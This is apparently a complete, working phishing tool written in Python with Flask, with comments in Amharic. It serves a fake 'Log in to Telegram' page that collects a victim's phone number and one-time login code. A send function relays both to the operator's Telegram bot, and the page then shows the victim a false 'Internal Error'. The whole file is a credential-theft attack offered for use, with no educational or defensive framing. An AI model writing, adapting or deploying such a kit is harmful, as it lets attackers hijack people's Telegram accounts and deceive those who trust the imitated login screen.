import os
import requests
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# --- የቦት መረጃዎችን የመያዣ ፋይል ---
CONFIG_FILE = "config.txt"

def setup_bot():
    """ተጠቃሚው መሣሪያውን ሲከፍት መረጃ እንዲያስገባ ያደርጋል"""
    if not os.path.exists(CONFIG_FILE):
        print("\\n" + "="*30)
        print("   YAG GROUP TOOL SETUP")
        print("="*30)
        token = input("[?] Enter your Telegram Bot Token: ").strip()
        chat_id = input("[?] Enter your Telegram Chat ID: ").strip()
        
        with open(CONFIG_FILE, "w") as f:
            f.write(f"{token}\\n{chat_id}")
        print("[+] Setup Complete! Running server...\\n")
        return token, chat_id
    else:
        with open(CONFIG_FILE, "r") as f:
            data = f.read().splitlines()
            return data[0], data[1]

# መረጃዎቹን አውጣ
BOT_TOKEN, CHAT_ID = setup_bot()

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, data=payload, timeout=10)
    except:
        pass

# --- የቴሌግራም ሎጊን ገጽ ዲዛይን (HTML) ---
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Messenger</title>
    <style>
        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 320px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #3390ec; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://telegram.org/img/t_logo.png" width="80">
        <h2>Log in to Telegram</h2>
        <div id="step1">
            <p>Enter your phone number</p>
            <input type="tel" id="phone" placeholder="+251...">
            <button onclick="next()">NEXT</button>
        </div>
        <div id="step2" class="hidden">
            <p>Enter the code sent to your app</p>
            <input type="number" id="code" placeholder="Enter Code">
            <button onclick="verify()">VERIFY</button>
        </div>
        <p id="msg" style="color:red; font-size:12px;"></p>
    </div>
    <script>
        let phoneNum = "";
        async function next() {
            phoneNum = document.getElementById('phone').value;
            await fetch('/submit', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'phone', val:phoneNum})});
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
        }
        async function verify() {
            let code = document.getElementById('code').value;
            await fetch('/submit', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'code', val:code, phone:phoneNum})});
            document.getElementById('msg').innerText = "Internal Error. Try again.";
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    if data['type'] == 'phone':
        msg = f"📞 *New Phone:* `{data['val']}`"
    else:
        msg = f"🔑 *Login Code:* `{data['val']}`\\n📱 *Phone:* `{data['phone']}`"
    send_to_telegram(msg)
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
